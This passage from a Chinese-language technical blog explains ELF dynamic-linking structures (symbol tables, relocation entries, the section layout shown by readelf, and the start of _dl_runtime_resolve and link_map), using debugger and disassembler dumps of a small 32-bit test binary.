<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Symbol table entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span>    <span class="number">4</span>字节</span><br><span class="line">  Elf32_Addr	st_value;		<span class="comment">/* Symbol value */</span>                      <span class="number">4</span>字节</span><br><span class="line">  Elf32_Word	st_size;		<span class="comment">/* Symbol size */</span>                       <span class="number">4</span>字节</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span>           <span class="number">1</span>字节</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>	st_other;		<span class="comment">/* Symbol visibility */</span>                 <span class="number">1</span>字节</span><br><span class="line">  Elf32_Section	st_shndx;		<span class="comment">/* Section index */</span>                     <span class="number">2</span>字节</span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span>   <span class="number">4</span>字节</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span>          <span class="number">1</span>字节</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;		<span class="comment">/* Symbol visibility */</span>                <span class="number">1</span>字节</span><br><span class="line">  Elf64_Section	st_shndx;		<span class="comment">/* Section index */</span>                    <span class="number">2</span>字节</span><br><span class="line">  Elf64_Addr	st_value;		<span class="comment">/* Symbol value */</span>                     <span class="number">8</span>字节</span><br><span class="line">  Elf64_Xword	st_size;		<span class="comment">/* Symbol size */</span>                      <span class="number">8</span>字节</span><br><span class="line">&#125; Elf64_Sym;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The syminfo section if available contains additional information about</span></span><br><span class="line"><span class="comment">   every dynamic symbol.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Word;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint16_t</span> Elf32_Section;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf64_Word;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint16_t</span> Elf64_Section;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Xword;</span><br></pre></td></tr></table></figure>

<p>以 <code>Elf32_Sym &lt;offset aPrintf - offset byte_804820C, 0, 0, 12h, 0, 0&gt; ; &quot;printf&quot;</code>为例</p>
<p>offset aPrintf - offset byte_804820C=0x0804822B-0x804820C=0x1F,所属结构体对应到内存中的形式为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>wx <span class="number">0x080481AC</span></span><br><span class="line"><span class="number">0x80481ac</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>  <span class="comment">// &lt;0&gt;</span></span><br><span class="line"><span class="number">0x80481bc</span>:	<span class="number">0x0000001f</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000012</span>  <span class="comment">// printf </span></span><br><span class="line"><span class="number">0x80481cc</span>:	<span class="number">0x0000001a</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000012</span>  <span class="comment">//puts</span></span><br><span class="line"><span class="number">0x80481dc</span>:	<span class="number">0x00000042</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000020</span>  <span class="comment">//__gmon_start__</span></span><br><span class="line"><span class="number">0x80481ec</span>:	<span class="number">0x00000026</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000012</span>  <span class="comment">//__libc_start_main</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>该结构体中的各个成员的含义如下：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>st_name</td>
<td>符号在字符串表中对应的索引。如果该值非 0，则它表示了给出符号名的字符串表索引，否则符号表项没有名称。 注：外部 C 符号在 C 语言和目标文件的符号表中具有相同的名称。</td>
</tr>
<tr>
<td>st_value</td>
<td>给出与符号相关联的数值，具体取值依赖于上下文，可能是一个正常的数值、一个地址等等。</td>
</tr>
<tr>
<td>st_size</td>
<td>给出对应符号所占用的大小。如果符号没有大小或者大小未知，则此成员为 0。</td>
</tr>
<tr>
<td>st_info</td>
<td>给出符号的类型和绑定属性。之后会给出若干取值和含义的绑定关系。</td>
</tr>
<tr>
<td>st_other</td>
<td>目前为 0，其含义没有被定义。</td>
</tr>
<tr>
<td>st_shndx</td>
<td>如果符号定义在该文件中，那么该成员为符号所在节在节区头部表中的下标；如果符号不在本目标文件中，或者对于某些特殊的符号，该成员具有一些特殊含义。</td>
</tr>
</tbody></table>
<p>其中，符号表中下标 0 存储了符号表的一个元素，同时这个元素也相对比较特殊，作为所有未定义符号的索引，具体如下</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>取值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>st_name</td>
<td>0</td>
<td>无名称</td>
</tr>
<tr>
<td>st_value</td>
<td>0</td>
<td>0 值</td>
</tr>
<tr>
<td>st_size</td>
<td>0</td>
<td>无大小</td>
</tr>
<tr>
<td>st_info</td>
<td>0</td>
<td>无类型，局部绑定</td>
</tr>
<tr>
<td>st_other</td>
<td>0</td>
<td>无附加信息</td>
</tr>
<tr>
<td>st_shndx</td>
<td>0</td>
<td>无节区</td>
</tr>
</tbody></table>
<ul>
<li><p>st_name:在上面的printf例子中，st_name的值为offset aPrintf - offset byte_804820C=0x0804822B-0x804820C=0x1F，该值代表着该符号的字符串名称相对于ELF String Table起始地址的偏移；若该值为0则表示此符号没有名称。</p>
</li>
<li><p>st_value:在该程序的_IO_stdin_used中，此处的值并没有和其他的符号一样为0，而是一个地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LOAD:<span class="number">080481F</span>C                 Elf32_Sym &lt;offset aIoStdinUsed - offset byte_804820C, \ ; <span class="string">&quot;_IO_stdin_used&quot;</span></span><br><span class="line">LOAD:<span class="number">080481F</span>C                            offset _IO_stdin_used, <span class="number">4</span>, <span class="number">11</span>h, <span class="number">0</span>, <span class="number">10</span>h&gt;</span><br><span class="line">    </span><br><span class="line">.rodata:<span class="number">0804852</span>C                 <span class="keyword">public</span> _IO_stdin_used</span><br><span class="line">.rodata:<span class="number">0804852</span>C _IO_stdin_used  db    <span class="number">1</span>                 ; DATA XREF: LOAD:<span class="number">080481F</span>C↑o</span><br><span class="line">.rodata:<span class="number">0804852</span>D                 db    <span class="number">0</span></span><br><span class="line">.rodata:<span class="number">0804852</span>E                 db    <span class="number">2</span></span><br><span class="line">.rodata:<span class="number">0804852F</span>                 db    <span class="number">0</span></span><br></pre></td></tr></table></figure>

<ol>
<li>该符号对应着一个变量，那么表明该变量在内存中的偏移。我们可由这个值获取其文件偏移<ol>
<li>获取该符号对应的 <code>st_shndx</code>，进而获取到相关的节区。</li>
<li>根据节区头元素可以获取节区的虚拟基地址和文件基地址。</li>
<li>value - 内存基虚拟地址 = 文件偏移 - 文件基地址</li>
</ol>
</li>
<li>该符号对应着一个函数，那么表明该函数在文件中的起始地址。</li>
</ol>
<p>所以st_value没有固定的类型，根据符号类型和用途，它可能是一个数值或地址，在编译的过程中依据上下文来确定。</p>
</li>
<li><p>st_info : st_info 中包含符号类型和绑定信息，这里给出了控制它的值的方式具体信息如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_TYPE(i)    ((i)&amp;0xf)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_INFO(b, t) (((b)&lt;&lt;4) + ((t)&amp;0xf))</span></span><br></pre></td></tr></table></figure>

<p>可以看出 st_info 的低 4 位表示符号的类型，具体定义如下</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>取值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>STT_NOTYPE</td>
<td>0</td>
<td>符号的类型没有定义。</td>
</tr>
<tr>
<td>STT_OBJECT</td>
<td>1</td>
<td>符号与某个数据对象相关，比如一个变量、数组等等。</td>
</tr>
<tr>
<td>STT_FUNC</td>
<td>2</td>
<td>符号与某个函数或者其他可执行代码相关。</td>
</tr>
<tr>
<td>STT_SECTION</td>
<td>3</td>
<td>符号与某个节区相关。这种类型的符号表项主要用于重定位，通常具有 STB_LOCAL 绑定。</td>
</tr>
<tr>
<td>STT_FILE</td>
<td>4</td>
<td>一般情况下，符号的名称给出了生成该目标文件相关的源文件的名称。如果存在的话，该符号具有 STB_LOCAL 绑定，其节区索引是 SHN_ABS 且优先级比其他<code>STB_LOCAL</code>符号高。</td>
</tr>
<tr>
<td><code>STT_LOPROC</code>～<code>STT_HIPROC</code></td>
<td>13~15</td>
<td>保留用于特定处理器</td>
</tr>
</tbody></table>
<p>根据 <code>#define ELF32_ST_BIND(i) ((i)&gt;&gt;4)</code> 可以看出 st_info 的高 4 位表示符号绑定的信息。而这部分信息确定了符号的链接可见性以及其行为，具体的取值如下</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>取值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>STB_LOCAL</td>
<td>0</td>
<td>表明该符号为局部符号，在包含该符号定义的目标文件以外不可见。相同名称的局部符号可以存在于多个文件中，互不影响。</td>
</tr>
<tr>
<td>STB_GLOBAL</td>
<td>1</td>
<td>表明该符号为全局符号，对所有将被组合在一起的目标文件都是可见的。一个文件中对某个全局符号的定义将满足另一个文件对相同全局符号的未定义引用。我们称初始化非零变量的全局符号为强符号，只能定义一次。</td>
</tr>
<tr>
<td>STB_WEAK</td>
<td>2</td>
<td>弱符号与全局符号类似，不过它们的定义优先级比较低。</td>
</tr>
<tr>
<td>STB_LOPROC ~STB_HIPROC</td>
<td>13</td>
<td>这个范围的取值是保留给处理器专用语义的。</td>
</tr>
</tbody></table>
<p>在每个符号表中，所有具有 STB_LOCAL 绑定的符号都优先于弱符号和全局符号。符号表节区中的 sh_info 项所对应的头部的成员包含第一个非局部符号的符号表索引。</p>
<p>此外，全局符号与弱符号的主要区别如下：</p>
<ul>
<li>当链接器在链接多个可重定位目标文件时，不允许定义多个相同名字的 <code>STB_GLOBAL</code> 符号。另一方面，如果存在一个已定义全局符号，则同名的弱符号的存在不会引起错误。链接器会优先选择全局定义，忽略弱符号定义。类似的，如果一个公共符号存在 (<code>st_shndx</code>域为<code>SHN_COMMON</code>的符号)，则同名的弱符号的存在不会引起错误。链接器会选择公共定义，忽略弱符号定义。</li>
<li>当链接器寻找文件库时，它会提取包含未定义全局符号的成员，可能是一个全局符号或者弱符号。链接器不会为了解决未定义的弱符号问题而提取文件，未定义的弱符号的值为 0。</li>
</ul>
<p>printf中的0x12对应的即为STT_FUNC（2）和STB_GLOBAL（1）</p>
</li>
</ul>
<h5 id="DYNAMIC-gt-DT-JMPREL"><a href="#DYNAMIC-gt-DT-JMPREL" class="headerlink" title="_DYNAMIC-&gt;DT_JMPREL"></a>_DYNAMIC-&gt;DT_JMPREL</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">LOAD:<span class="number">08049714</span>                 Elf32_Dyn &lt;<span class="number">17</span>h, &lt;<span class="number">8048294</span>h&gt;&gt; ; DT_JMPREL</span><br><span class="line">LOAD:<span class="number">0804971</span>C                 Elf32_Dyn &lt;<span class="number">11</span>h, &lt;<span class="number">804828</span>Ch&gt;&gt; ; DT_REL</span><br><span class="line"></span><br><span class="line">LOAD:<span class="number">0804828</span>C ; ELF REL Relocation Table</span><br><span class="line">LOAD:<span class="number">0804828</span>C                 Elf32_Rel &lt;<span class="number">804977</span>Ch, <span class="number">306</span>h&gt; ; R_386_GLOB_DAT __gmon_start__</span><br><span class="line">LOAD:<span class="number">08048294</span> ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:<span class="number">08048294</span>                 Elf32_Rel &lt;<span class="number">804978</span>Ch, <span class="number">107</span>h&gt; ; R_386_JMP_SLOT <span class="built_in">printf</span></span><br><span class="line">LOAD:<span class="number">0804829</span>C                 Elf32_Rel &lt;<span class="number">8049790</span>h, <span class="number">207</span>h&gt; ; R_386_JMP_SLOT <span class="built_in">puts</span></span><br><span class="line">LOAD:<span class="number">080482</span>A4                 Elf32_Rel &lt;<span class="number">8049794</span>h, <span class="number">407</span>h&gt; ; R_386_JMP_SLOT __libc_start_main</span><br><span class="line">LOAD:<span class="number">080482</span>A4 LOAD            ends</span><br><span class="line">LOAD:<span class="number">080482</span>A4</span><br></pre></td></tr></table></figure>

<p>这里涉及到一个新的结构体 Elf32_Rel，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.27/elf/elf.h 中</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Relocation table entry without addend (in section of type SHT_REL).  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr	r_offset;		<span class="comment">/* Address */</span>   <span class="comment">//uint32_t大小为4字节</span></span><br><span class="line">  Elf32_Word	r_info;			<span class="comment">/* Relocation type and symbol index */</span>  <span class="comment">//uint32_t大小为4字节</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* I have seen two different definitions of the Elf64_Rel and</span></span><br><span class="line"><span class="comment">   Elf64_Rela structures, so we&#x27;ll leave them out until Novell (or</span></span><br><span class="line"><span class="comment">   whoever) gets their act together.  */</span></span><br><span class="line"><span class="comment">/* The following, at least, is used on Sparc v9, MIPS, and Alpha.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf64_Rel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Relocation table entry with addend (in section of type SHT_RELA).  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf32_Sword	r_addend;		<span class="comment">/* Addend */</span>  <span class="comment">//此成员给出一个常量补齐，用来计算将被填充到可重定位字段的数值。</span></span><br><span class="line">&#125; Elf32_Rela;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword	r_addend;		<span class="comment">/* Addend */</span>   </span><br><span class="line">&#125; Elf64_Rela;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Elf32_Rela 类型的表项包含明确的补齐信息。 Elf32_Rel 类型的表项在将被修改的位置保存隐式的补齐信息。由于处理器体系结构的原因，这两种形式都存在，甚至是必需的。因此，对特定机器的实现可以仅使用一种形式，也可以根据上下文使用两种形式。</p>
<p>其中，每个字段的说明如下</p>
<table>
<thead>
<tr>
<th>成员</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>r_offset</td>
<td><strong>此成员给出了需要重定位的位置。</strong>对于一个可重定位文件而言，此值是从需要重定位的符号所在节区头部开始到将被重定位的位置之间的字节偏移。对于可执行文件或者共享目标文件而言，其取值是需要重定位的<strong>虚拟地址</strong>，一般而言，也就是说我们所说的 GOT 表的地址。</td>
</tr>
<tr>
<td>r_info</td>
<td><strong>此成员给出需要重定位的符号的符号表索引，以及相应的重定位类型。</strong> 例如一个调用指令的重定位项将包含被调用函数的符号表索引。如果索引是 STN_UNDEF，那么重定位使用 0 作为 “符号值”。此外，重定位类型是和处理器相关的。</td>
</tr>
<tr>
<td>r_addend</td>
<td>此成员给出一个常量补齐，用来计算将被填充到可重定位字段的数值。</td>
</tr>
</tbody></table>
<p>关于 r_info 更加具体的字段信息如下面的代码所示</p>
<ul>
<li>r_info 的高三个字节对应的值表示这个动态符号在 <code>.dynsym</code> 符号表中的位置</li>
<li> r_info 的最低字节表示的是重定位类型类型</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define ELF32_R_SYM(i)    ((i)&gt;&gt;8)</span><br><span class="line">#define ELF32_R_TYPE(i)   ((unsigned char)(i))</span><br><span class="line">// 用于构造 r_info</span><br><span class="line">#define ELF32_R_INFO(s,t) (((s)&lt;&lt;8)+(unsigned char)(t))</span><br></pre></td></tr></table></figure>

<p>以  <code>Elf32_Rel &lt;804978Ch, 107h&gt; ; R_386_JMP_SLOT printf</code>为例:</p>
<ul>
<li><p>r_offset对于可执行文件而言，其取值是需要重定位的虚拟地址，一般而言就是got表的地址：0x804978C</p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236496.png" alt="image-20220627113928884"></p>
</li>
<li><p>r_info,用于解析符号时的寻址过程，r_info &gt;&gt; 8后会得到一个索引（0x107 &gt;&gt; 8==0x1），对应此导入符号在ELF Symbol Table中的索引：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">LOAD:<span class="number">080481</span>AC ; ELF Symbol Table</span><br><span class="line">LOAD:<span class="number">080481</span>AC                 Elf32_Sym &lt;<span class="number">0</span>&gt;</span><br><span class="line">LOAD:<span class="number">080481B</span>C                 Elf32_Sym &lt;offset aPrintf - offset byte_804820C, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>h, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;printf&quot;</span></span><br><span class="line">LOAD:<span class="number">080481</span>CC                 Elf32_Sym &lt;offset aPuts - offset byte_804820C, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>h, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;puts&quot;</span></span><br><span class="line">LOAD:<span class="number">080481</span>DC                 Elf32_Sym &lt;offset aGmonStart - offset byte_804820C, <span class="number">0</span>, <span class="number">0</span>, <span class="number">20</span>h, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;__gmon_start__&quot;</span></span><br><span class="line">LOAD:<span class="number">080481</span>EC                 Elf32_Sym &lt;offset aLibcStartMain - offset byte_804820C, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>h, <span class="number">0</span>, \ ; <span class="string">&quot;__libc_start_main&quot;</span></span><br><span class="line">LOAD:<span class="number">080481</span>EC                            <span class="number">0</span>&gt;</span><br><span class="line">LOAD:<span class="number">080481F</span>C                 Elf32_Sym &lt;offset aIoStdinUsed - offset byte_804820C, \ ; <span class="string">&quot;_IO_stdin_used&quot;</span></span><br><span class="line">LOAD:<span class="number">080481F</span>C                            offset _IO_stdin_used, <span class="number">4</span>, <span class="number">11</span>h, <span class="number">0</span>, <span class="number">10</span>h&gt;</span><br><span class="line">LOAD:<span class="number">0804820</span>C ; ELF String Table</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="segment-and-section"><a href="#segment-and-section" class="headerlink" title="segment and section"></a>segment and section</h5><p>虽然在DT_STRTAB、DT_SYMTAB和DT_JMPREL都是属于LOAD段（segment），但是他们是属于不同的节（section），可以使用readelf来查看程序的所有节及其各个属性：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">qqq@qqq-virtual-machine:~/challenge$ readelf -S ./test</span><br><span class="line">There are 35 section headers, starting at offset 0x1708:</span><br><span class="line"></span><br><span class="line">节头：</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048134 000134 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048148 000148 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048168 000168 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        0804818c 00018c 000020 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481ac 0001ac 000060 10   A  6   1  4 //DT_SYMTAB</span><br><span class="line">  [ 6] .dynstr           STRTAB          0804820c 00020c 000051 00   A  0   0  1  //DT_STRTAB</span><br><span class="line">  [ 7] .gnu.version      VERSYM          0804825e 00025e 00000c 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         0804826c 00026c 000020 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             0804828c 00028c 000008 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             08048294 000294 000018 08  AI  5  23  4  //DT_JMPREL</span><br><span class="line">  [11] .init             PROGBITS        080482ac 0002ac 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        080482d0 0002d0 000040 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        08048310 000310 000008 08  AX  0   0  8</span><br><span class="line">  [14] .text             PROGBITS        08048320 000320 0001f2 00  AX  0   0 16</span><br><span class="line">  [15] .fini             PROGBITS        08048514 000514 000014 00  AX  0   0  4</span><br><span class="line">  [16] .rodata           PROGBITS        08048528 000528 00002a 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame_hdr     PROGBITS        08048554 000554 00003c 00   A  0   0  4</span><br><span class="line">  [18] .eh_frame         PROGBITS        08048590 000590 0000fc 00   A  0   0  4</span><br><span class="line">  [19] .init_array       INIT_ARRAY      0804968c 00068c 000004 04  WA  0   0  4</span><br><span class="line">  [20] .fini_array       FINI_ARRAY      08049690 000690 000004 04  WA  0   0  4</span><br><span class="line">  [21] .dynamic          DYNAMIC         08049694 000694 0000e8 08  WA  6   0  4</span><br><span class="line">  [22] .got              PROGBITS        0804977c 00077c 000004 04  WA  0   0  4</span><br><span class="line">  [23] .got.plt          PROGBITS        08049780 000780 000018 04  WA  0   0  4</span><br><span class="line">  [24] .data             PROGBITS        08049798 000798 000008 00  WA  0   0  4</span><br><span class="line">  [25] .bss              NOBITS          080497a0 0007a0 000004 00  WA  0   0  1</span><br><span class="line">  [26] .comment          PROGBITS        00000000 0007a0 000029 01  MS  0   0  1</span><br><span class="line">  [27] .debug_aranges    PROGBITS        00000000 0007c9 000020 00      0   0  1</span><br><span class="line">  [28] .debug_info       PROGBITS        00000000 0007e9 00033f 00      0   0  1</span><br><span class="line">  [29] .debug_abbrev     PROGBITS        00000000 000b28 0000ef 00      0   0  1</span><br><span class="line">  [30] .debug_line       PROGBITS        00000000 000c17 0000c4 00      0   0  1</span><br><span class="line">  [31] .debug_str        PROGBITS        00000000 000cdb 000292 01  MS  0   0  1</span><br><span class="line">  [32] .symtab           SYMTAB          00000000 000f70 000460 10     33  49  4</span><br><span class="line">  [33] .strtab           STRTAB          00000000 0013d0 0001f3 00      0   0  1</span><br><span class="line">  [34] .shstrtab         STRTAB          00000000 0015c3 000145 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  p (processor specific)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="dl-runtime-resolve"><a href="#dl-runtime-resolve" class="headerlink" title="_dl_runtime_resolve"></a>_dl_runtime_resolve</h4><p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236498.png" alt="image-20220627123308845"></p>
<p>因为有两个push并且可执行文件是32位的，所以可以将其中的两句push语句当作_dl_runtime_resolve的参数：_dl_runtime_resolve(link_map, reloc_arg)，其中reloc_arg==0，参数link_map也就是上图中地址0x8049784下存放的0xf7ffd940：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236499.png" alt="image-20220627153818338"></p>
<p><code>&amp;link_map==*(GOT+4)==*（_GLOBAL_OFFSET_TABLE_+4）==0xf7ffd940</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236500.png" alt="image-20220627123501663"></p>
<p>link_map的本质是一个巨大的结构体链表，这个链表的作用是记录程序加载的所有共享库的信息,可以看到  <code>ElfW(Dyn) *l_ld;        /* Dynamic section of the shared object.  */</code>l_ld指向dynamic</p>
